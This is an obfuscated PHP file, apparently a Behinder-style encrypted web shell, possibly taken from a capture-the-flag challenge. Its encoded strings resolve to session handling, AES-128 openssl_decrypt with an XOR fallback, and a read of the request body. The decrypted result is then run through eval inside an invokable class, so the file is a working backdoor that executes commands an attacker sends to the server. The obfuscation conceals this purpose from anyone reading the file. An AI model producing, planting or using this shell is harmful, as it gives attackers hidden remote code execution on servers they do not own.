<?php
/*
-- EnPHP v2: http://enphp.djunny.com/
*/
echo "source in /source.txt\n";
error_reporting(0);
function 챊�()
{
    $���� = func_get_args();
    $���� = 0x15f3;
    if ($����[0x2] == $���� + 0x28) {
        return base64_decode('b3BlbnNzbF9kZWNyeXB0');
    }
    if ($����[0x2] == $���� + 0x8b) {
        return base64_decode(join("", array('Q', 'U', 'V', 'T', 'M', 'T', 'I', '4')));
    }
    if ($����[0x2] == $���� + 0xc4) {
        return parse_str("ZXhwbG9kZQ", $����) || $���� ? base64_decode(key($����)) : "";
    }
    if ($����[0] == $���� + 0x114) {
        return "|";
    }
}
function ��՗()
{
    $��ٺ = 0x235f;
    $�ࢹ = func_get_args();
    if ($�ࢹ[0x2] == $��ٺ + 0x1c) {
        return base64_decode(str_rot13('p3ElpzI2'));
    }
    if ($�ࢹ[0x2] == $��ٺ + 0x7c) {
        return base64_decode(str_rot13('p3EhMKEho2AsqTIaK2IfnJL'));
    }
    if ($�ࢹ[0] == $��ٺ + 0xca) {
        return base64_decode(str_rot13('qUIjozxiYmcjnUN'));
    }
    if ($�ࢹ[0x2] == $��ٺ + 0xe8) {
        return base64_decode(join("", array('b', 'H', 'N', 'z', 'b', 'm', 'V', 'w', 'b', 'w')));
    }
    if (func_get_arg(0x1) == $��ٺ + 0x112) {
        return "edoced_46esab";
    }
}
function ����()
{
    $�ڐ� = func_get_args();
    $˩�� = 0x24e1;
    if ($�ڐ�[0x2] == $˩�� + 0x2b) {
        return gzinflate('K-*�/�/J-�/*��K ');
    }
    if ($�ڐ�[0] == $˩�� + 0x52) {
        return base64_decode('c2Vzc2lvbl9zdGFydA') ?: $Թ��;
    }
    if ($�ڐ�[0x2] == $˩�� + 0x71) {
        return gzinflate('�44NN346O3J3��0K ');
    }
    if ($�ڐ�[0] == $˩�� + 0xb4) {
        return base64_decode('aw') ?: $����;
    }
    if ($�ڐ�[0x2] == $˩�� + 0xd3) {
        return parse_str("c2Vzc2lvbl93cml0ZV9jbG9zZQ", $����) || $���� ? base64_decode(key($����)) : "";
    }
}
@����(0x251d, 0x2528, 0x250c)(0);
����(0x2533)();
$��� = ����(0x256e, 0x2589, 0x2552, $���);
$_SESSION[����(0x2595)] = $���;
����(0x25db, 0x25f3, 0x25b4)();
$���� = ��՗(0x23a1, 0x23ce, 0x237b)(��՗(0x23ea, 0x240a, 0x23db))(��՗(0x23a1, 0x23ce, 0x237b)(��՗(0x2429)));
if (!extension_loaded(strrev(��՗(0x2455, 0x2464, 0x2447)))) {
    $���� = ��՗(0x23a1, 0x23ce, 0x237b)(��՗(0x2494, 0x2471));
    $���� = $����($���� . "");
    $���� = 0;
    while ($���� < strlen($����)) {
        $����[$����] = $����[$����] ^ $���[$���� + 0x1 & 0xf];
        $����++;
    }
} else {
    $���� = 챊�(0x1643, 0x1663, 0x161b)($����, 챊�(0x169e, 0x16a9, 0x167e), $���);
}
$�� = 챊�(0x16e6, 0x16f2, 0x16b7)(챊�(0x1707), $����);
$ٺ�� = $��[0];
$���� = $��[0x1];
class C
{
    public function __invoke($��)
    {
        eval($�� . (parse_str("", $��ѓ) || $��ѓ ? base64_decode(key($��ѓ)) : ""));
    }
}
@call_user_func(new C(), $����);